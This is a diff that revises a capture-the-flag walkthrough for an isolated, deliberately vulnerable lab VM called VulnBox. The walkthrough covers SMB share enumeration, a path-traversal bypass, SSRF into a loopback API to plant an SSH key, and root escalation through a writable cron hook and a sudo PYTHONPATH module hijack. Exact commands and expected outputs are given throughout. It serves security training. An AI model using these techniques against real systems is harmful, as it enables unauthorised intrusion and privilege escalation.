@@ -1,33 +1,33 @@
 # VulnBox End-to-End Walkthrough (`0-knowledge` to `root`)
 
-This guide walks step by step from an unauthenticated host on the isolated VirtualBox `vboxnet0` network (`192.168.56.0/24`) to full `root` access on **VulnBox** (`192.168.56.101`). Each step follows a **command -> explanation -> expected output** flow so you can copy-paste commands individually and verify every layer.
+This guide walks step by step from an unauthenticated host on the isolated VirtualBox `vboxnet0` network (`192.168.56.0/24`) to full `root` access on **VulnBox** (`192.168.56.101`). Each step is tagged with where it runs (`[Host]` vs. `[VM: dev@vulnbox]`) and follows a **command -> explanation -> expected output** flow so you can copy-paste commands individually and verify every layer.
 
 ---
 
-## Prerequisites & Target Discovery
+## Prerequisites & Target Discovery (`[Host]`)
 
 Make sure your analyst machine is attached to `vboxnet0` (`192.168.56.0/24`) and has `nmap`, `smbclient`, `curl`, and an OpenSSH client installed.
 
 ```bash
-nmap -sV -p 22,445,5000,8080 192.168.56.101
+sudo nmap -sV -p 22,445,5000,8080 192.168.56.101
 ```
 
 **Why this matters:**
-Only ports `22/tcp` (SSH), `445/tcp` (Samba), and `8080/tcp` (Nginx) are allowed through UFW. Port `5000/tcp` shows `filtered` because UFW drops incoming connections to it and Flask binds strictly to `127.0.0.1:5000`. *(If VirtualBox DHCP assigned a different address in `192.168.56.0/24`, run `nmap -sn 192.168.56.0/24` first and replace `192.168.56.101` below.)*
+Only ports `22/tcp` (SSH), `445/tcp` (Samba), and `8080/tcp` (Nginx) are allowed through UFW. Port `5000/tcp` shows `filtered` because UFW drops incoming connections to it and Flask binds strictly to `127.0.0.1:5000`. *(You can also run `nmap -sV` without `sudo`. If VirtualBox DHCP assigned a different address in `192.168.56.0/24`, run `nmap -sn 192.168.56.0/24` first and replace `192.168.56.101` below.)*
 
 ```text
 PORT     STATE    SERVICE     VERSION
-22/tcp   open     ssh         OpenSSH 9.x (Ubuntu)
-445/tcp  open     netbios-ssn Samba smbd 4.x
+22/tcp   open     ssh         OpenSSH 10.2p1 Ubuntu 2ubuntu3.8 (Ubuntu Linux; protocol 2.0)
+445/tcp  open     netbios-ssn Samba smbd 4.6.2
 5000/tcp filtered upnp
-8080/tcp open     http        nginx
+8080/tcp open     http        nginx 1.28.3 (Ubuntu)
 ```
 
 ---
 
-## Stage 1: Samba Anonymous Share Enumeration (`:445`, `nobody`)
+## Stage 1: Samba Anonymous Share Enumeration (`[Host]`, `:445`, `nobody`)
 
-### Step 1.1. List available SMB shares
+### Step 1.1 (`[Host]`). List available SMB shares
 
 ```bash
 smbclient -N -L //192.168.56.101/
@@ -39,9 +39,11 @@ smbclient -N -L //192.168.56.101/
         Sharename       Type      Comment
         ---------       ----      -------
         public          Disk      VulnBox Public Deployment Notes
+        IPC$            IPC       IPC Service (VulnBox File Server)
+SMB1 disabled -- no workgroup available
 ```
 
-### Step 1.2. Download and read `deployment-notes.txt`
+### Step 1.2 (`[Host]`). Download and read `deployment-notes.txt`
 
 ```bash
 smbclient -N //192.168.56.101/public -c "get deployment-notes.txt -"
@@ -76,9 +78,9 @@ Remove this draft file from /srv/samba/public before production handover.
 
 ---
 
-## Stage 2: Web Diagnostics & Path Normalization Bypass (`:8080`, `www-data`)
+## Stage 2: Web Diagnostics & Path Normalization Bypass (`[Host]`, `:8080`, `www-data`)
 
-### Step 2.1. Inspect the diagnostics portal status page
+### Step 2.1 (`[Host]`). Inspect the diagnostics portal status page
 
 ```bash
 curl -s "http://192.168.56.101:8080/?module=status"
@@ -98,7 +100,7 @@ Usage:
   ?proxy_path=<endpoint>&token=<tok> - Query local management API on 127.0.0.1:5000
 ```
 
-### Step 2.2. Read `/opt/internal_api/config.ini` via `?log=`
+### Step 2.2 (`[Host]`). Read `/opt/internal_api/config.ini` via `?log=`
 
 ```bash
 curl -s "http://192.168.56.101:8080/?log=....//....//....//opt/internal_api/config.ini"
@@ -130,7 +132,7 @@ authorized_keys_path = /home/dev/.ssh/authorized_keys
 
 ## Stage 3 & Stage 4: Loopback Flask API (`127.0.0.1:5000`) & SSH Access (`dev`)
 
-### Step 3.1. Query the loopback API through the PHP proxy bridge
+### Step 3.1 (`[Host]`). Query the loopback API through the PHP proxy bridge
 
 ```bash
 curl -s "http://192.168.56.101:8080/?proxy_path=/api/v1/info&token=vb-internal-9f8e7d6c5b4a3f2e1d0c"
@@ -142,7 +144,7 @@ curl -s "http://192.168.56.101:8080/?proxy_path=/api/v1/info&token=vb-internal-9
 {"authorized_keys_path":"/home/dev/.ssh/authorized_keys","endpoints":["/health","/api/v1/info","/api/v1/ssh-key"],"managed_account":"dev","service":"vulnbox-internal-api"}
 ```
 
-### Step 3.2. Ensure you have an Ed25519 SSH keypair on your analyst host
+### Step 3.2 (`[Host]`). Ensure you have an Ed25519 SSH keypair on your analyst host
 
 ```bash
 [ -f ~/.ssh/id_ed25519 ] || ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N ""
@@ -150,7 +152,7 @@ curl -s "http://192.168.56.101:8080/?proxy_path=/api/v1/info&token=vb-internal-9
 
 **Explanation:** Generates `~/.ssh/id_ed25519` and `~/.ssh/id_ed25519.pub` if you do not already have one, without overwriting existing keys.
 
-### Step 3.3. Register your SSH public key via `POST /api/v1/ssh-key`
+### Step 3.3 (`[Host]`). Register your SSH public key via `POST /api/v1/ssh-key`
 
 ```bash
 curl -s -X POST "http://192.168.56.101:8080/?proxy_path=/api/v1/ssh-key&token=vb-internal-9f8e7d6c5b4a3f2e1d0c" \
@@ -163,13 +165,27 @@ curl -s -X POST "http://192.168.56.101:8080/?proxy_path=/api/v1/ssh-key&token=vb
 {"account":"dev","authorized_keys_path":"/home/dev/.ssh/authorized_keys","status":"registered"}
 ```
 
-### Step 4.1. Log in as `dev` via SSH and read `user.txt`
+### Step 4.1 (`[Host]`). Log in as `dev` via SSH
 
 ```bash
-ssh -i ~/.ssh/id_ed25519 dev@192.168.56.101 "id && cat /home/dev/user.txt"
+ssh -i ~/.ssh/id_ed25519 dev@192.168.56.101
 ```
 
-**Explanation:** Authenticates as `dev` using the key just registered (note that `dev` has a locked password, so SSH requires key authentication; avoid 5 failed SSH attempts within 10 minutes or Fail2Ban will ban your IP for 15 minutes). Next, connect interactively with `ssh -i ~/.ssh/id_ed25519 dev@192.168.56.101` to run the Stage 5 checks inside the VM.
+**Explanation:** Authenticates as `dev` using the registered key and opens an interactive shell on `vulnbox` (type `yes` if prompted to accept the SSH host fingerprint). Because `dev` has a locked password, key authentication is the only way in; avoid 5 failed SSH attempts within 10 minutes or Fail2Ban will ban your IP for 15 minutes. Keep this `dev@vulnbox:~$` session open for Step 4.2 and Stage 5.
+
+```text
+Welcome to Ubuntu 26.04.1 LTS (GNU/Linux 7.0.0-44-generic x86_64)
+...
+dev@vulnbox:~$
+```
+
+### Step 4.2 (`[VM: dev@vulnbox]`). Verify identity and read `/home/dev/user.txt`
+
+```bash
+id && cat /home/dev/user.txt
+```
+
+**Explanation:** Confirms your UID/GID context (`dev`) and retrieves the first stage flag while staying logged in inside `dev@vulnbox:~$`.
 
 ```text
 uid=1001(dev) gid=1001(dev) groups=1001(dev)
@@ -178,17 +194,13 @@ FLAG{Us3r_Sh3ll!7xK9#mP2@vQ4_d3v%8nR1}
 
 ---
 
-## Stage 5: Privilege Escalation (`dev` -> `root`, Two Independent Paths)
+## Stage 5: Privilege Escalation (`[VM: dev@vulnbox]`, `dev` -> `root`, Two Paths)
 
-Open an interactive SSH session on the target first:
-
-```bash
-ssh -i ~/.ssh/id_ed25519 dev@192.168.56.101
-```
+Run all Stage 5 steps inside the `dev@vulnbox:~$` SSH session opened in Step 4.1.
 
 ### Path A: Writable `cron` Hook Script (`root` execution every 60s)
 
-#### Step 5A.1. Inspect the scheduled task and hook permissions
+#### Step 5A.1 (`[VM: dev@vulnbox]`). Inspect the scheduled task and hook permissions
 
 ```bash
 cat /etc/cron.d/vulnbox-maintenance && cat /opt/admin/backup_check.sh && ls -la /opt/admin/hooks/pre_backup.sh
@@ -197,10 +209,16 @@ cat /etc/cron.d/vulnbox-maintenance && cat /opt/admin/backup_check.sh && ls -la 
 **Explanation:** `/etc/cron.d/vulnbox-maintenance` runs `/opt/admin/backup_check.sh` every minute as `root`, and `backup_check.sh` executes `/opt/admin/hooks/pre_backup.sh` if it is executable (`-x`). Because `pre_backup.sh` has mode `0775` and group `dev`, the `dev` user can modify its contents.
 
 ```text
--rwxrwxr-x 1 root dev 106 ... /opt/admin/hooks/pre_backup.sh
+# /etc/cron.d/vulnbox-maintenance
+SHELL=/bin/bash
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+* * * * * root /opt/admin/backup_check.sh >/dev/null 2>&1
+...
+-rwxrwxr-x 1 root dev 106 Nov 23 21:15 /opt/admin/hooks/pre_backup.sh
 ```
 
-#### Step 5A.2. Write a verification payload to `pre_backup.sh` and wait 1 minute
+#### Step 5A.2 (`[VM: dev@vulnbox]`). Write a verification payload to `pre_backup.sh`
 
 ```bash
 cat << 'EOF' > /opt/admin/hooks/pre_backup.sh
@@ -215,7 +233,7 @@ EOF
 
 **Explanation:** Overwrites `pre_backup.sh` **in-place** (preserving its `0775` execute bit so `[ -x "${HOOK_SCRIPT}" ]` remains true). On the next minute tick, `cron` executes it as `root` and writes `/root/root.txt` to `/tmp/cron_verify.out` owned by `dev`.
 
-#### Step 5A.3. Read the root output after the cron tick
+#### Step 5A.3 (`[VM: dev@vulnbox]`). Wait up to 1 minute and read the root output
 
 ```bash
 sleep 65 && cat /tmp/cron_verify.out
@@ -230,20 +248,21 @@ FLAG{R00t_Pwn3d!9zW6@kL3#bT8_sys%4mX2}
 
 ### Path B: `sudoers.d` `SETENV` + `PYTHONPATH` Module Hijack (Immediate `root`)
 
-#### Step 5B.1. Check allowed `sudo` rules and inspect `/opt/admin/maintenance.py`
+#### Step 5B.1 (`[VM: dev@vulnbox]`). Check allowed `sudo` rules and inspect `/opt/admin/maintenance.py`
 
 ```bash
 sudo -l && ls -la /opt/admin/status_helper.py && cat /opt/admin/maintenance.py
 ```
 
-**Explanation:** `/etc/sudoers.d/90-dev-admin` combines `Defaults:dev env_keep += "PYTHONPATH"` with `NOPASSWD: SETENV: /usr/bin/python3 /opt/admin/maintenance.py`. In addition, `/opt/admin/maintenance.py` removes its own directory from the front of `sys.path` and appends it to the end so directories passed in `PYTHONPATH` take precedence when importing `status_helper`. *(As an alternative without `PYTHONPATH`, `/opt/admin/status_helper.py` itself is also writable by group `dev` with mode `0664`.)*
+**Explanation:** `/etc/sudoers.d/90-dev-admin` combines `Defaults:dev env_keep += "PYTHONPATH"` with `SETENV: NOPASSWD: /usr/bin/python3 /opt/admin/maintenance.py`. In addition, `/opt/admin/maintenance.py` removes its own directory from the front of `sys.path` and appends it to the end so directories passed in `PYTHONPATH` take precedence when importing `status_helper`. *(As an alternative without `PYTHONPATH`, `/opt/admin/status_helper.py` itself is also writable by group `dev` with mode `0664`.)*
 
 ```text
 User dev may run the following commands on vulnbox:
-    (root) NOPASSWD: SETENV: /usr/bin/python3 /opt/admin/maintenance.py
+    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/admin/maintenance.py
+-rw-rw-r-- 1 root dev 344 Nov 23 21:15 /opt/admin/status_helper.py
 ```
 
-#### Step 5B.2. Create a rogue `/tmp/status_helper.py` module
+#### Step 5B.2 (`[VM: dev@vulnbox]`). Create a rogue `/tmp/status_helper.py` module
 
 ```bash
 cat << 'EOF' > /tmp/status_helper.py
@@ -260,7 +279,7 @@ EOF
 
 **Explanation:** Implements the `collect_system_summary()` function expected by `maintenance.py`, returning the effective UID (`0`) and `/root/root.txt`.
 
-#### Step 5B.3. Execute `maintenance.py` via `sudo` with `PYTHONPATH=/tmp`
+#### Step 5B.3 (`[VM: dev@vulnbox]`). Execute `maintenance.py` via `sudo` with `PYTHONPATH=/tmp`
 
 ```bash
 sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/admin/maintenance.py
